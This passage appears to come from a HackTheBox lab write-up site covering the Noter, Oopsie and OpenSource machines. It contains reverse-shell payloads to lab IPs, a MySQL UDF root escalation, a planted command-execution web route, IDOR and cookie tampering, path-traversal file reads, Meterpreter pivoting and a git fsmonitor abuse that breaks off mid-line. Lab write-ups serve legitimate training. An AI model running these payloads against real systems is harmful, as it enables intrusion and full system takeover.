a payload like this:</p> <p><pre><code>' || ping -c 2 10.10.14.27 #\n</code></pre> Bash will execute the ping command as you can see here:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Noter]\n\u2514\u2500$ sudo tcpdump -i tun0 icmp\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes\n13:12:02.238973 IP 10.10.11.160 &gt; 10.10.14.27: ICMP echo request, id 5, seq 1, length 64\n13:12:02.239002 IP 10.10.14.27 &gt; 10.10.11.160: ICMP echo reply, id 5, seq 1, length 64\n13:12:03.239702 IP 10.10.11.160 &gt; 10.10.14.27: ICMP echo request, id 5, seq 2, length 64\n13:12:03.239718 IP 10.10.14.27 &gt; 10.10.11.160: ICMP echo reply, id 5, seq 2, length 64\n</code></pre> <p>Changing a bit the payload we can get a reverse shell! <pre><code>' || bash -i &amp;&gt; /dev/tcp/10.10.14.27/8080 0&gt;&amp;1 #\n</code></pre></p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Noter]\n\u2514\u2500$ nc -lnvp 8080\nlistening on [any] 8080 ...\nconnect to [10.10.14.27] from (UNKNOWN) [10.10.11.160] 36412\nbash: cannot set terminal process group (1261): Inappropriate ioctl for device\nbash: no job control in this shell\nsvc@noter:~/app/web$\n</code></pre>"},{"location":"HackTheBox/Noter/#in-the-machine-as-svc","title":"In the machine as svc","text":"<p>First of all we can retrieve the MySQL database credentials from the application file:</p> <pre><code>app.config['MYSQL_USER'] = 'DB_user'\napp.config['MYSQL_PASSWORD'] = 'DB_password'\napp.config['MYSQL_DB'] = 'app'\n</code></pre> <p>Also, looking into the old backup I found the credentials for the MySQL root user: <pre><code>app.config['MYSQL_USER'] = 'root'\napp.config['MYSQL_PASSWORD'] = 'Nildogg36'\n</code></pre></p> <p>Using any of the credentials above it is possible to get the <code>blue</code> user password hash: <pre><code>$5$rounds=535000$76NyOgtW18b3wIqL$HZqlzNHs1SdzbAb2V6EyAnqYNskA3K.8e1iDesL5vI2\n</code></pre> Maybe we can try to crack it but for now, let's get the user flag under <code>/home/svc/user.txt</code> and create an SSH key pair to get a more stable SSH terminal.</p>"},{"location":"HackTheBox/Noter/#getting-root","title":"Getting root","text":"<p>To be honest I spent more time than I'm willing to admit here. First of all, cheking for the user running the MySQL server we can see it is actually <code>root</code>:</p> <pre><code>svc@noter:~$ cat mysql_service \n\u25cf mysql.service - LSB: Start and stop the mysql database server daemon\n     Loaded: loaded (/etc/init.d/mysql; generated)\n     Active: active (running) since Thu 2022-05-26 11:36:32 UTC; 1 day 8h ago\n       Docs: man:systemd-sysv-generator(8)\n    Process: 950 ExecStart=/etc/init.d/mysql start (code=exited, status=0/SUCCESS)\n      Tasks: 56 (limit: 4617)\n     Memory: 270.3M\n     CGroup: /system.slice/mysql.service\n             \u251c\u25001058 /bin/sh /usr/bin/mysqld_safe\n             \u251c\u25001178 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user=root --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock\n             \u2514\u25001179 logger -t mysqld -p daemon error\n</code></pre> <p>Since we can have the credentials for the MySQL <code>root</code> user we can try to scale using a malicious library. We can use <code>lib_mysqludf_sys</code> from Metasploit, in Kali is located here:</p> <pre><code># The target system is a 64 bits one\n/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so\n</code></pre> <p>Using Netcat or a simple HTTP server I moved the library to <code>/home/svc</code> in the target machine and now we can start with the trick. Login to MySQL using the <code>root</code> user with the credentials found earlier and then we can load the library and get a reverse shell as <code>root</code>:</p> <pre><code>MariaDB [(none)]&gt; use mysql;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMariaDB [mysql]&gt; create table npn(line blob);\nQuery OK, 0 rows affected (0.005 sec)\n\n# Change PATH if necessary here\nMariaDB [mysql]&gt; insert into npn values(load_file('/home/svc/lib_mysqludf_sys.so'));\nQuery OK, 1 row affected (0.002 sec)\n\nMariaDB [mysql]&gt; select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';\nQuery OK, 1 row affected (0.001 sec)\n\nMariaDB [mysql]&gt; create function sys_exec returns integer soname 'lib_mysqludf_sys.so';\nQuery OK, 0 rows affected (0.001 sec)\n\n# Before executing this command make sure you have Netcat listenner ready!\n# Also change this according to your listener IP and port\nMariaDB [mysql]&gt; select sys_exec('bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.27/8080 0&gt;&amp;1\"');\n</code></pre> <p>After all that a <code>root</code> reverse shell arrive to the listener and we can get the final flag under <code>/root/root.txt</code>:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lnvp 8080\nlistening on [any] 8080 ...\nconnect to [10.10.14.27] from (UNKNOWN) [10.10.11.160] 38376\nbash: cannot set terminal process group (950): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@noter:/var/lib/mysql#\n</code></pre> <p>If you are having problems getting the library to load, make sure you execute all the commands fast. There is a script in place that reset all changes to the MySQL service and can troll a bit.</p>"},{"location":"HackTheBox/Oopsie/","title":"Oopsie","text":""},{"location":"HackTheBox/Oopsie/#nmap-scan","title":"nmap scan","text":"<p>Look's like only ports 22 and 80 are open:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Oopsie]\n\u2514\u2500$ sudo nmap &lt;MACHINE_IP&gt; -p- -v\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-08-31 10:01 EDT\nInitiating Ping Scan at 10:01\nScanning &lt;MACHINE_IP&gt; [4 ports]\nCompleted Ping Scan at 10:01, 0.11s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 10:01\nCompleted Parallel DNS resolution of 1 host. at 10:01, 0.05s elapsed\nInitiating SYN Stealth Scan at 10:01\nScanning &lt;MACHINE_IP&gt; [65535 ports]\nDiscovered open port 22/tcp on &lt;MACHINE_IP&gt;\nDiscovered open port 80/tcp on &lt;MACHINE_IP&gt;\nCompleted SYN Stealth Scan at 10:02, 33.14s elapsed (65535 total ports)\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.055s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 33.59 seconds\n           Raw packets sent: 65552 (2.884MB) | Rcvd: 66053 (2.747MB)\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Oopsie]\n\u2514\u2500$ sudo nmap &lt;MACHINE_IP&gt; -p 22,80 -sC -sV\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-08-31 10:06 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.049s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)\n|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)\n|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Welcome\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 13.41 seconds\n</code></pre>"},{"location":"HackTheBox/Oopsie/#port-80","title":"Port 80","text":"<p>Here we find the MegaCorp Automotive website that works with <code>php</code> files. With manual enumeration the admin email: <code>admin@megacorp.com</code> can be discovered and also a login page at <code>/cdn-cgi/login/</code>.</p> <p>According to <code>gobuster</code> a <code>uploads</code> directory is present. The server has the directory listing disabled sadly so let's note that for later.</p> <p>Using a previous challenge password we can login with <code>admin:MEGACORP_4dm1n!!</code>!. Once inside, the admin pannel looks like there is an upload feature but requires super admin access, the thing is that this page looks vulnerable to <code>IDOR</code> vulnerability in <code>/cdn-cgi/login/admin.php?content=accounts&amp;id=1</code> because it is possible to specify any <code>id</code> we want. With a little Python script let's look for that super admin account (Burb can be used but hey, i wanted to be creative here):</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Oopsie]\n\u2514\u2500$ ./enumerate_users.py\nIndex: 1 --&gt; &lt;tr&gt;&lt;th&gt;Access ID&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;34322&lt;/td&gt;&lt;td&gt;admin&lt;/td&gt;&lt;td&gt;admin@megacorp.com&lt;/td&gt;&lt;/tr&gt;\nIndex: 2 --&gt; Not exists\nIndex: 3 --&gt; Not exists\nIndex: 4 --&gt; &lt;tr&gt;&lt;th&gt;Access ID&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;8832&lt;/td&gt;&lt;td&gt;john&lt;/td&gt;&lt;td&gt;john@tafcz.co.uk&lt;/td&gt;&lt;/tr&gt;\nIndex: 5 --&gt; Not exists\nIndex: 6 --&gt; Not exists\nIndex: 7 --&gt; Not exists\nIndex: 8 --&gt; Not exists\nIndex: 9 --&gt; Not exists\nIndex: 10 --&gt; Not exists\nIndex: 11 --&gt; Not exists\nIndex: 12 --&gt; Not exists\nIndex: 13 --&gt; &lt;tr&gt;&lt;th&gt;Access ID&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;57633&lt;/td&gt;&lt;td&gt;Peter&lt;/td&gt;&lt;td&gt;peter@qpic.co.uk&lt;/td&gt;&lt;/tr&gt;\nIndex: 14 --&gt; Not exists\nIndex: 15 --&gt; Not exists\nIndex: 16 --&gt; Not exists\nIndex: 17 --&gt; Not exists\nIndex: 18 --&gt; Not exists\nIndex: 19 --&gt; Not exists\nIndex: 20 --&gt; Not exists\nIndex: 21 --&gt; Not exists\nIndex: 22 --&gt; Not exists\nIndex: 23 --&gt; &lt;tr&gt;&lt;th&gt;Access ID&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;28832&lt;/td&gt;&lt;td&gt;Rafol&lt;/td&gt;&lt;td&gt;tom@rafol.co.uk&lt;/td&gt;&lt;/tr&gt;\nIndex: 24 --&gt; Not exists\nIndex: 25 --&gt; Not exists\nIndex: 26 --&gt; Not exists\nIndex: 27 --&gt; Not exists\nIndex: 28 --&gt; Not exists\nIndex: 29 --&gt; Not exists\nIndex: 30 --&gt; &lt;tr&gt;&lt;th&gt;Access ID&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;86575&lt;/td&gt;&lt;td&gt;super admin&lt;/td&gt;&lt;td&gt;superadmin@megacorp.com&lt;/td&gt;&lt;/tr&gt;\nIndex: 31 --&gt; Not exists\nIndex: 32 --&gt; Not exists\n</code></pre> <p>Our super admin account has the id 30. Checking the page cookies i found 2 of them: user (The access key id) and role, because they are just plain text values we can change it to whatever we want. In this case:</p> <pre><code>role=super admin\nuser=86575\n</code></pre> <p>Now we can use the upload feature and get a potencial RCE.</p>"},{"location":"HackTheBox/Oopsie/#reverse-shell","title":"Reverse shell","text":"<p>To get a reverse shell we have to upload a PHP reverse shell to the page and after setting up the listenner we can just execute it in <code>/uploads/ourFile.php</code>.</p>"},{"location":"HackTheBox/Oopsie/#privesc","title":"Privesc","text":""},{"location":"HackTheBox/Oopsie/#as-www-data-in-the-box","title":"As www-data in the box","text":"<p>Looking around the box i found the credentials for the database:</p> <pre><code>www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php \n&lt;?php\n$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');\n?&gt;\n</code></pre> <p>Maybe we can try that credentials to get access to the box robert account:</p> <pre><code>www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert\nPassword: M3g4C0rpUs3r!\nrobert@oopsie:/var/www/html/cdn-cgi/login$\n</code></pre> <p>Cool! We have <code>ssh</code> access too now.</p>"},{"location":"HackTheBox/Oopsie/#as-robert-in-the-box","title":"As robert in the box","text":"<p>The user flag is in <code>/home/robert/user.txt</code>. Looking around, looks like <code>robert</code> is part of the <code>bugtracker</code> group. This group can execute a SUID binary owned by <code>root</code>.</p> <p>The program basically executes <code>cat /root/reports/</code> with a 'bug id' concatenated to the end but it doesn't sanitize the user input so we can abuse it:</p> <pre><code>------------------\n: EV Bug Tracker :\n------------------\n\nProvide Bug ID: ;id\n---------------\n\ncat: /root/reports/: Is a directory\nuid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)\n</code></pre> <p>As we can see, we executed the <code>id</code> command as <code>root</code> since this program has the SUID binary set, lets get <code>root</code> access:</p> <pre><code>------------------\n: EV Bug Tracker :\n------------------\n\nProvide Bug ID: ;bash\n---------------\n\ncat: /root/reports/: Is a directory\nroot@oopsie:/# \n</code></pre> <p>The <code>root</code> flag is in <code>/root/root.txt</code>.</p>"},{"location":"HackTheBox/OpenSource/","title":"OpenSource","text":""},{"location":"HackTheBox/OpenSource/#nmap-scan","title":"Nmap scan","text":"<p>As always time for a full port simple Nmap scan and then I will throw a more detailed one only on open ports:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate 1000 10.10.11.164\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 04:56 EDT\nNmap scan report for 10.10.11.164\nHost is up (0.056s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE    SERVICE\n22/tcp   open     ssh\n80/tcp   open     http\n3000/tcp filtered ppp\n\nNmap done: 1 IP address (1 host up) scanned in 19.19 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p22,80,3000 -sC -sV 10.10.11.164          \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 04:57 EDT\nNmap scan report for 10.10.11.164\nHost is up (0.052s latency).\n\nPORT     STATE    SERVICE VERSION\n22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)\n|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)\n|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)\n80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3\n| fingerprint-strings: \n|   GetRequest: \n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/2.1.2 Python/3.10.3\n|     Date: Mon, 30 May 2022 08:57:23 GMT\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 5316\n|     Connection: close\n|     &lt;html lang=\"en\"&gt;\n|     &lt;head&gt;\n|     &lt;meta charset=\"UTF-8\"&gt;\n|     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n|     &lt;title&gt;upcloud - Upload files for Free!&lt;/title&gt;\n|     &lt;script src=\"/static/vendor/jquery/jquery-3.4.1.min.js\"&gt;&lt;/script&gt;\n|     &lt;script src=\"/static/vendor/popper/popper.min.js\"&gt;&lt;/script&gt;\n|     &lt;script src=\"/static/vendor/bootstrap/js/bootstrap.min.js\"&gt;&lt;/script&gt;\n|     &lt;script src=\"/static/js/ie10-viewport-bug-workaround.js\"&gt;&lt;/script&gt;\n|     &lt;link rel=\"stylesheet\" href=\"/static/vendor/bootstrap/css/bootstrap.css\"/&gt;\n|     &lt;link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-grid.css\"/&gt;\n|     &lt;link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-reboot.css\"/&gt;\n|     &lt;link rel=\n|   HTTPOptions: \n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/2.1.2 Python/3.10.3\n|     Date: Mon, 30 May 2022 08:57:24 GMT\n|     Content-Type: text/html; charset=utf-8\n|     Allow: GET, OPTIONS, HEAD\n|     Content-Length: 0\n|     Connection: close\n|   RTSPRequest: \n|     &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n|     \"http://www.w3.org/TR/html4/strict.dtd\"&gt;\n|     &lt;html&gt;\n|     &lt;head&gt;\n|     &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt;\n|     &lt;title&gt;Error response&lt;/title&gt;\n|     &lt;/head&gt;\n|     &lt;body&gt;\n|     &lt;h1&gt;Error response&lt;/h1&gt;\n|     &lt;p&gt;Error code: 400&lt;/p&gt;\n|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;\n|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;\n|     &lt;/body&gt;\n|_    &lt;/html&gt;\n|_http-title: upcloud - Upload files for Free!\n|_http-server-header: Werkzeug/2.1.2 Python/3.10.3\n3000/tcp filtered ppp\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 93.74 seconds\n</code></pre> <p>Looks like port 3000 is detected as filtered, for now I will focus on the ports 22 and 80 and if I can't find anything we can try to investigate the 3000 too.</p>"},{"location":"HackTheBox/OpenSource/#upcloud","title":"Upcloud","text":""},{"location":"HackTheBox/OpenSource/#lfi-but-not-more","title":"LFI but not more","text":"<p>We are welcomed by a landing page that allows us to go to an application to upload files, what could be handy, and also allows us to download the source code of this application.</p> <p>The service is running on Flask so it is a Python application what means that uploading PHP files to get RCE won't work. The thing is that looking at the code, it is pretty easy to notice a LFI vulnerability.</p> <p>Just url encoding a payload like <code>..//etc/passwd</code> and passing it to the <code>/uploads</code> directory will give us the <code>/etc/passwd</code> file:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl http://10.10.11.164/uploads/%2E%2E%2F%2F/etc/passwd\nroot:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\n</code></pre> <p>After some testing I can confirm the application is  as <code>root</code> inside the container (We can access the <code>/etc/shadow</code>), there is a <code>Dockerfile</code> in the downloaded app that suggest this but is good to confirm it.</p> <p>Cool but what about now? LFI does not give us RCE so what now? Well I remembered that we have a landing page and I did not try to Gobuster it:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ gobuster dir -u http://10.10.11.164/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt       \n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.11.164/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/05/30 06:59:20 Starting gobuster in directory enumeration mode\n===============================================================\n/download             (Status: 200) [Size: 2489147]\n/console              (Status: 200) [Size: 1563]   \n\n===============================================================\n2022/05/30 07:00:41 Finished\n===============================================================\n</code></pre> <p>Ok, we can access a Python console in <code>/console</code> but we don't have the PIN to unlock it... maybe the LFI is the answer. We know thanks to the <code>supervisord.conf</code> that flask STDOUT is located at <code>/dev/stdout</code> but looks like is configured to avoid output to that file.</p> <p>Looking around I discovered that the code we got before is actually a Git repository! It has two branches, <code>main</code> and <code>dev</code>. Researching the <code>dev</code> one I found that this is actually what is deployed in the target and not what I was inspecting before (Was enough to get LFI though).</p> <p>Researching the repository I found some juicy information in one of the commits to the <code>dev</code> branch: </p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/OpenSource/source]\n\u2514\u2500$ git show a76f8f75f7a4a12b706b0cf9c983796fa1985820\ncommit a76f8f75f7a4a12b706b0cf9c983796fa1985820\nAuthor: gituser &lt;gituser@local&gt;\nDate:   Thu Apr 28 13:46:16 2022 +0200\n\n    updated\n\ndiff --git a/app/.vscode/settings.json b/app/.vscode/settings.json\nnew file mode 100644\nindex 0000000..5975e3f\n--- /dev/null\n+++ b/app/.vscode/settings.json\n@@ -0,0 +1,5 @@\n+{\n+  \"python.pythonPath\": \"/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python\",\n+  \"http.proxy\": \"http://dev01:Soulless_Developer#2022@10.10.10.128:5187/\",\n+  \"http.proxyStrictSSL\": false\n+}\n</code></pre> <p>I don't really know what this proxy is or does but everything points out that is in the real machine so let's keep the credentials <code>dev01:Soulless_Developer#2022</code> and wait for a reverse shell to start investigating this.</p>"},{"location":"HackTheBox/OpenSource/#rce","title":"RCE","text":"<p>Next idea, the upload functionality use the same sanitization method we know is vulnerable so if we can send a file with a name like <code>..//app/app/views.py</code>, we will overwrite the application <code>views.py</code> file and inject custom code. In order to achieve this we can use Burpsuite to catch the upload request and change the filename there.</p> <p>I uploaded the new <code>view.py</code> file adding this function:</p> <pre><code>...\n@app.route('/anthares')\ndef omega():\n    args = request.args\n    command = args.get(\"cmd\", default=\"id\", type=str)\n\n    return os.popen(command).read()\n...\n</code></pre> <p>And I just had to use a url encoded Python reverse shell to get into the container:</p> <pre><code>http://10.10.11.164/anthares?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.21%22%2C8000%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27\n</code></pre> <p>The only problem is that the application is run in Docker, what means that we will need to scape now, the SSH service is probably running in the real machine though.</p>"},{"location":"HackTheBox/OpenSource/#trying-to-scape-from-the-container","title":"Trying to scape from the container","text":"<p>So we are now inside the container as <code>root</code> but we want to own the machine not this. I starte enumerating a bit but I could not find something obvious so I tried to scan the real host from the container with Nmap. Looks like that filtered port 3000 is indeed openned to the container and according to information I got using <code>wget</code> from the container is hosting a Gitea application. There are also other ports open I will take a look later if necessary: 6000, 6001, 6002, 6003, 6004, 6005, 6006 and 6007.</p> <p>Cool, time to pivot because I don't want to enumerate this web page using only the reverse shell. I will create and upload a meterpreter binary to get a session in Metasploit and then using routes and the <code>auxiliary/server/socks_proxy</code> module I will set up a SOCKS5 proxy:</p> <pre><code># Generate a Meterpreter binary and upload it to the container\nmsfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.21 LPORT=8080 -f elf &gt; shell-x64.elf\n\n# Start the handler and execute the Meterpreter binary to get a session\nmsf6 &gt; use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter_reverse_tcp\npayload =&gt; linux/x64/meterpreter_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set LHOST tun0\nLHOST =&gt; 10.10.14.21\nmsf6 exploit(multi/handler) &gt; set LPORT 8080\nLPORT =&gt; 8080\nmsf6 exploit(multi/handler) &gt; exploit\n\n[*] Started reverse TCP handler on 10.10.14.21:8080 \n[*] Meterpreter session 1 opened (10.10.14.21:8080 -&gt; 10.10.11.164:55180 ) at 2022-05-30 13:56:22 -0400\n\n#Once in meterpreter just run autoroute to create a route to the network we want to reach\nmeterpreter &gt; run autoroute -s 172.17.0.1\n\n[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.\n[!] Example: run post/multi/manage/autoroute OPTION=value [...]\n[*] Adding a route to 172.17.0.1/255.255.255.0...\n[+] Added route to 172.17.0.1/255.255.255.0 via 10.10.11.164\n[*] Use the -p option to list all active routes\n\n\n# Once the route is added, use auxiliary/server/socks_proxy and let the proxy running\n</code></pre> <p>Once all that is done, I changed Proxychains and Firefox configuration to use the Meterpreter proxy. We can reach the new target now from our machine!</p> <p>Using the credentials we found before: <code>dev01:Soulless_Developer#2022</code> I was able to login to Gitea and get access to a private repositoriy: <code>dev01/home-backup</code>. Inside, I got the private key for the <code>dev01</code> user in the real machine so we have scaped the container now.</p>"},{"location":"HackTheBox/OpenSource/#as-dev01-in-the-machine","title":"As dev01 in the machine","text":"<p>The first thing is taking the flag under <code>/home/dev01/user.txt</code> and then checked the open ports:</p> <pre><code>dev01@opensource:~$ netstat -ltpn\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 172.17.0.1:6000         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 172.17.0.1:6001         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 172.17.0.1:6002         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 172.17.0.1:6003         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 172.17.0.1:6004         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   \ntcp        0      0 172.17.0.1:6005         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 172.17.0.1:6006         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   \ntcp        0      0 172.17.0.1:6007         0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      - \n</code></pre> <p>As we saw before, a lot of ports open only in <code>172.17.0.1</code> address. The port 3000 is open to all addreses but probably the application is filtering traffic and the port from 6000 to 6007 are hosting the same <code>Upcloud</code> than the container... maybe another way of scaping the container?</p> <p>Anyway, after some basic enumerarion I launched Pspy to check if something stick out:</p> <pre><code>2022/05/30 18:58:04 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity \n2022/05/30 18:59:01 CMD: UID=0    PID=9424   | /bin/bash /usr/local/bin/git-sync \n2022/05/30 18:59:01 CMD: UID=0    PID=9423   | /bin/sh -c /usr/local/bin/git-sync \n2022/05/30 18:59:01 CMD: UID=0    PID=9422   | /usr/sbin/CRON -f \n2022/05/30 18:59:01 CMD: UID=0    PID=9429   | git push origin main \n2022/05/30 18:59:01 CMD: UID=0    PID=9430   | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git \n</code></pre> <p>As you can see, there is a Cronjob run by <code>root</code> that is using the following script to backup the user home folder to the Gitea repository:</p> <pre><code>dev01@opensource:~$ cat /usr/local/bin/git-sync\n#!/bin/bash\n\ncd /home/dev01/\n\nif ! git status --porcelain; then\n    echo \"No changes\"\nelse\n    day=$(date +'%Y-%m-%d')\n    echo \"Changes detected, pushing..\"\n    git add .\n    git commit -m \"Backup for ${day}\"\n    git push origin main\nfi\n</code></pre> <p>At first I though that this was not interesting but I found this blog: https://github.blog/2022-04-12-git-security-vulnerability-announced/. </p> <p>According to the blog, if we set the <code>core.fsmonitor</code> variable in the <code>config</code> file inside a <code>.git</code> directory we can get arbitrary code execution when a command like <code>git status</code> is run in the repository. So changing the <code>config</code> file of the <code>dev01</code> home folder repository a bit we can get <code>root</code>:</p> <pre><code>.git/config\n\n[core]\n        ...\n        fsmonitor = chmod u+s 